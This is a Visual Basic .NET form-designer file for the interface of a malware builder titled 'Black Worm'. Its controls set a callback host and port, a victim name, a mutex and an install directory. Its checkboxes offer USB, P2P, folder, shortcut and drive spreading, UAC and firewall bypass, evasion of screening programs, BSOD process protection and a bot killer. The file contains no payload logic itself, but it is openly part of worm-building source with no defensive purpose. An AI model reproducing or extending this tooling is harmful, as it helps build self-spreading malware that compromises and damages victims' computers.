<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form2
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.host = New System.Windows.Forms.TextBox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Button1 = New System.Windows.Forms.Button()
        Me.s = New System.Windows.Forms.SaveFileDialog()
        Me.TextBox1 = New System.Windows.Forms.TextBox()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.vn = New System.Windows.Forms.TextBox()
        Me.port = New System.Windows.Forms.TextBox()
        Me.startupname = New System.Windows.Forms.TextBox()
        Me.bsod = New System.Windows.Forms.CheckBox()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.exename = New System.Windows.Forms.TextBox()
        Me.cicon = New System.Windows.Forms.CheckBox()
        Me.iconBox = New System.Windows.Forms.PictureBox()
        Me.FW = New System.Windows.Forms.CheckBox()
        Me.mutex = New System.Windows.Forms.TextBox()
        Me.folder = New System.Windows.Forms.CheckBox()
        Me.BypassSP = New System.Windows.Forms.CheckBox()
        Me.p2p = New System.Windows.Forms.CheckBox()
        Me.exe = New System.Windows.Forms.RadioButton()
        Me.link = New System.Windows.Forms.RadioButton()
        Me.shortcut = New System.Windows.Forms.CheckBox()
        Me.uac = New System.Windows.Forms.CheckBox()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.PathS = New System.Windows.Forms.ComboBox()
        Me.CheckBox1 = New System.Windows.Forms.CheckBox()
        Me.CheckBox3 = New System.Windows.Forms.CheckBox()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.TextBox2 = New System.Windows.Forms.TextBox()
        CType(Me.iconBox, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(14, 14)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(59, 13)
        Me.Label1.TabIndex = 0
        Me.Label1.Text = "IP \ Host : "
        '
        'host
        '
        Me.host.Location = New System.Drawing.Point(69, 11)
        Me.host.Name = "host"
        Me.host.Size = New System.Drawing.Size(149, 20)
        Me.host.TabIndex = 1
        Me.host.Text = "127.0.0.1"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(36, 39)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(37, 13)
        Me.Label2.TabIndex = 0
        Me.Label2.Text = "Port : "
        '
        'Button1
        '
        Me.Button1.Location = New System.Drawing.Point(8, 452)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(212, 23)
        Me.Button1.TabIndex = 2
        Me.Button1.Text = "~ [ Build WorM ] ~"
        Me.Button1.UseVisualStyleBackColor = True
        '
        's
        '
        Me.s.Title = "Choose a place to save your worm"
        '
        'TextBox1
        '
        Me.TextBox1.Location = New System.Drawing.Point(73, 15)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.Size = New System.Drawing.Size(149, 20)
        Me.TextBox1.TabIndex = 1
        Me.TextBox1.Text = "127.0.0.1"
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Location = New System.Drawing.Point(-1, 91)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(74, 13)
        Me.Label5.TabIndex = 0
        Me.Label5.Text = "Victim Name : "
        '
        'vn
        '
        Me.vn.Location = New System.Drawing.Point(69, 88)
        Me.vn.Name = "vn"
        Me.vn.Size = New System.Drawing.Size(149, 20)
        Me.vn.TabIndex = 1
        Me.vn.Text = "HacKed"
        '
        'port
        '
        Me.port.Enabled = False
        Me.port.Location = New System.Drawing.Point(69, 36)
        Me.port.Name = "port"
        Me.port.Size = New System.Drawing.Size(149, 20)
        Me.port.TabIndex = 8
        '
        'startupname
        '
        Me.startupname.Enabled = False
        Me.startupname.Location = New System.Drawing.Point(425, 430)
        Me.startupname.Name = "startupname"
        Me.startupname.Size = New System.Drawing.Size(136, 20)
        Me.startupname.TabIndex = 1
        Me.startupname.Visible = False
        '
        'bsod
        '
        Me.bsod.AutoSize = True
        Me.bsod.Location = New System.Drawing.Point(6, 332)
        Me.bsod.Name = "bsod"
        Me.bsod.Size = New System.Drawing.Size(139, 17)
        Me.bsod.TabIndex = 6
        Me.bsod.Text = "Protect Process [BSOD]"
        Me.bsod.UseVisualStyleBackColor = True
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(12, 115)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(62, 13)
        Me.Label3.TabIndex = 0
        Me.Label3.Text = "ExeName : "
        '
        'exename
        '
        Me.exename.Location = New System.Drawing.Point(69, 113)
        Me.exename.Name = "exename"
        Me.exename.Size = New System.Drawing.Size(149, 20)
        Me.exename.TabIndex = 1
        Me.exename.Text = "Worm.exe"
        '
        'cicon
        '
        Me.cicon.AutoSize = True
        Me.cicon.Location = New System.Drawing.Point(6, 424)
        Me.cicon.Name = "cicon"
        Me.cicon.Size = New System.Drawing.Size(87, 17)
        Me.cicon.TabIndex = 6
        Me.cicon.Text = "Change Icon"
        Me.cicon.UseVisualStyleBackColor = True
        '
        'iconBox
        '
        Me.iconBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.iconBox.Location = New System.Drawing.Point(175, 401)
        Me.iconBox.Name = "iconBox"
        Me.iconBox.Size = New System.Drawing.Size(45, 40)
        Me.iconBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.iconBox.TabIndex = 10
        Me.iconBox.TabStop = False
        '
        'FW
        '
        Me.FW.AutoSize = True
        Me.FW.Location = New System.Drawing.Point(6, 378)
        Me.FW.Name = "FW"
        Me.FW.Size = New System.Drawing.Size(145, 17)
        Me.FW.TabIndex = 6
        Me.FW.Text = "Bypass Windows Firewall"
        Me.FW.UseVisualStyleBackColor = True
        '
        'mutex
        '
        Me.mutex.Location = New System.Drawing.Point(268, 155)
        Me.mutex.Name = "mutex"
        Me.mutex.Size = New System.Drawing.Size(51, 20)
        Me.mutex.TabIndex = 13
        '
        'folder
        '
        Me.folder.AutoSize = True
        Me.folder.Location = New System.Drawing.Point(6, 240)
        Me.folder.Name = "folder"
        Me.folder.Size = New System.Drawing.Size(98, 17)
        Me.folder.TabIndex = 6
        Me.folder.Text = "Folders Spread"
        Me.folder.UseVisualStyleBackColor = True
        '
        'BypassSP
        '
        Me.BypassSP.AutoSize = True
        Me.BypassSP.Location = New System.Drawing.Point(6, 401)
        Me.BypassSP.Name = "BypassSP"
        Me.BypassSP.Size = New System.Drawing.Size(158, 17)
        Me.BypassSP.TabIndex = 6
        Me.BypassSP.Text = "Bypass Screening Programs"
        Me.BypassSP.TextAlign = System.Drawing.ContentAlignment.MiddleCenter
        Me.BypassSP.UseVisualStyleBackColor = True
        '
        'p2p
        '
        Me.p2p.AutoSize = True
        Me.p2p.Location = New System.Drawing.Point(6, 263)
        Me.p2p.Name = "p2p"
        Me.p2p.Size = New System.Drawing.Size(81, 17)
        Me.p2p.TabIndex = 6
        Me.p2p.Text = "P2P Spread"
        Me.p2p.UseVisualStyleBackColor = True
        '
        'exe
        '
        Me.exe.AutoSize = True
        Me.exe.Location = New System.Drawing.Point(6, 171)
        Me.exe.Name = "exe"
        Me.exe.Size = New System.Drawing.Size(109, 17)
        Me.exe.TabIndex = 16
        Me.exe.TabStop = True
        Me.exe.Text = "USB Spread / EXE"
        Me.exe.UseVisualStyleBackColor = True
        '
        'link
        '
        Me.link.AutoSize = True
        Me.link.Location = New System.Drawing.Point(6, 194)
        Me.link.Name = "link"
        Me.link.Size = New System.Drawing.Size(109, 17)
        Me.link.TabIndex = 17
        Me.link.TabStop = True
        Me.link.Text = "USB Spread / Link"
        Me.link.UseVisualStyleBackColor = True
        '
        'shortcut
        '
        Me.shortcut.AutoSize = True
        Me.shortcut.Location = New System.Drawing.Point(6, 217)
        Me.shortcut.Name = "shortcut"
        Me.shortcut.Size = New System.Drawing.Size(106, 17)
        Me.shortcut.TabIndex = 6
        Me.shortcut.Text = "ShortCut Spread"
        Me.shortcut.UseVisualStyleBackColor = True
        '
        'uac
        '
        Me.uac.AutoSize = True
        Me.uac.Location = New System.Drawing.Point(6, 355)
        Me.uac.Name = "uac"
        Me.uac.Size = New System.Drawing.Size(84, 17)
        Me.uac.TabIndex = 6
        Me.uac.Text = "Bypass UAC"
        Me.uac.UseVisualStyleBackColor = True
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Location = New System.Drawing.Point(9, 142)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(64, 13)
        Me.Label4.TabIndex = 0
        Me.Label4.Text = "Directory  : "
        '
        'PathS
        '
        Me.PathS.FormattingEnabled = True
        Me.PathS.Items.AddRange(New Object() {"Temp", "AppData", "UserProfile", "ProgramData", "WinDir"})
        Me.PathS.Location = New System.Drawing.Point(69, 139)
        Me.PathS.Name = "PathS"
        Me.PathS.Size = New System.Drawing.Size(149, 21)
        Me.PathS.TabIndex = 18
        Me.PathS.Text = "Temp"
        '
        'CheckBox1
        '
        Me.CheckBox1.AutoSize = True
        Me.CheckBox1.Location = New System.Drawing.Point(6, 286)
        Me.CheckBox1.Name = "CheckBox1"
        Me.CheckBox1.Size = New System.Drawing.Size(123, 17)
        Me.CheckBox1.TabIndex = 19
        Me.CheckBox1.Text = "Bot Killer [ Working ]"
        Me.CheckBox1.UseVisualStyleBackColor = True
        '
        'CheckBox3
        '
        Me.CheckBox3.AutoSize = True
        Me.CheckBox3.Location = New System.Drawing.Point(6, 309)
        Me.CheckBox3.Name = "CheckBox3"
        Me.CheckBox3.Size = New System.Drawing.Size(88, 17)
        Me.CheckBox3.TabIndex = 19
        Me.CheckBox3.Text = "Drive Spread"
        Me.CheckBox3.UseVisualStyleBackColor = True
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Location = New System.Drawing.Point(24, 66)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(50, 13)
        Me.Label6.TabIndex = 0
        Me.Label6.Text = "MUTEX : "
        '
        'TextBox2
        '
        Me.TextBox2.Location = New System.Drawing.Point(69, 62)
        Me.TextBox2.Name = "TextBox2"
        Me.TextBox2.Size = New System.Drawing.Size(149, 20)
        Me.TextBox2.TabIndex = 1
        Me.TextBox2.Text = "[ MUTEX ]"
        '
        'Form2
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(229, 477)
        Me.Controls.Add(Me.CheckBox3)
        Me.Controls.Add(Me.CheckBox1)
        Me.Controls.Add(Me.PathS)
        Me.Controls.Add(Me.link)
        Me.Controls.Add(Me.exe)
        Me.Controls.Add(Me.mutex)
        Me.Controls.Add(Me.iconBox)
        Me.Controls.Add(Me.port)
        Me.Controls.Add(Me.BypassSP)
        Me.Controls.Add(Me.cicon)
        Me.Controls.Add(Me.FW)
        Me.Controls.Add(Me.uac)
        Me.Controls.Add(Me.bsod)
        Me.Controls.Add(Me.p2p)
        Me.Controls.Add(Me.shortcut)
        Me.Controls.Add(Me.folder)
        Me.Controls.Add(Me.Button1)
        Me.Controls.Add(Me.startupname)
        Me.Controls.Add(Me.exename)
        Me.Controls.Add(Me.TextBox2)
        Me.Controls.Add(Me.vn)
        Me.Controls.Add(Me.Label2)
        Me.Controls.Add(Me.host)
        Me.Controls.Add(Me.Label4)
        Me.Controls.Add(Me.Label3)
        Me.Controls.Add(Me.Label6)
        Me.Controls.Add(Me.Label1)
        Me.Controls.Add(Me.Label5)
        Me.ForeColor = System.Drawing.Color.Maroon
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Form2"
        Me.ShowIcon = False
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Builder | Black Worm"
        Me.TopMost = True
        CType(Me.iconBox, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents host As System.Windows.Forms.TextBox
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents Button1 As System.Windows.Forms.Button
    Friend WithEvents s As System.Windows.Forms.SaveFileDialog
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents vn As System.Windows.Forms.TextBox
    Friend WithEvents port As System.Windows.Forms.TextBox
    Friend WithEvents startupname As System.Windows.Forms.TextBox
    Friend WithEvents bsod As System.Windows.Forms.CheckBox
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents exename As System.Windows.Forms.TextBox
    Friend WithEvents cicon As System.Windows.Forms.CheckBox
    Friend WithEvents iconBox As System.Windows.Forms.PictureBox
    Friend WithEvents FW As System.Windows.Forms.CheckBox
    Friend WithEvents mutex As System.Windows.Forms.TextBox
    Friend WithEvents folder As System.Windows.Forms.CheckBox
    Friend WithEvents BypassSP As System.Windows.Forms.CheckBox
    Friend WithEvents p2p As System.Windows.Forms.CheckBox
    Friend WithEvents exe As System.Windows.Forms.RadioButton
    Friend WithEvents link As System.Windows.Forms.RadioButton
    Friend WithEvents shortcut As System.Windows.Forms.CheckBox
    Friend WithEvents uac As System.Windows.Forms.CheckBox
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents PathS As System.Windows.Forms.ComboBox
    Friend WithEvents CheckBox1 As System.Windows.Forms.CheckBox
    Friend WithEvents CheckBox3 As System.Windows.Forms.CheckBox
    Friend WithEvents Label6 As System.Windows.Forms.Label
    Friend WithEvents TextBox2 As System.Windows.Forms.TextBox
End Class
